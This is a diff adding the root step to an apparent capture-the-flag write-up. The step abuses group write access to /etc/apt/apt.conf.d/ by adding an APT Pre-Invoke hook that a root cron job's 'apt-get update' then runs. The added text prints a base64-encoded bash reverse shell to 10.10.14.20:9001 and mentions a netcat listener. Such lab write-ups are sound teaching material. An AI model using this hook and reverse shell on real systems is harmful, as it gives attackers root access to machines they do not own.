@@ -161,4 +161,17 @@ I'll check what groups john is a part of and see what files his groups own
 
 <img src='Images/aptupdate.png'>
 
+we have write access over `/etc/apt/apt.conf.d/` as the `management` group. Further, `ps` shows root executing `apt-get update`. The files in `/etc/apt/apt.conf.d/` are instructions for the configuration of apt. To this end we can write a file which tells `apt` to execute something of our choosing. This can be done with `apt::update::pre-invoke {"command";};` which tells apt to run the command just before `apt update` is ran. I'll choose the payload to be the base64 encoded reverse shell I used earlier in the SSRF and I'll run:
+
+`echo 'apt::Update::Pre-Invoke {"echo -n L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjAvOTAwMSAwPiYxIg== | base64 -d | bash";};' > pwn`
+
+I'll set up a netcat listener on port 9001 and wait for the reverse shell to hit which it does after a minute or so
+
+<img src='Images/aptupdate.png'>
+
+checking the root crons I see root was running `apt-get update` every 2 minutes 
+
+<img src='Images/crontab.png'>
+
+From here I find the root flag in `/root/root.txt`
 
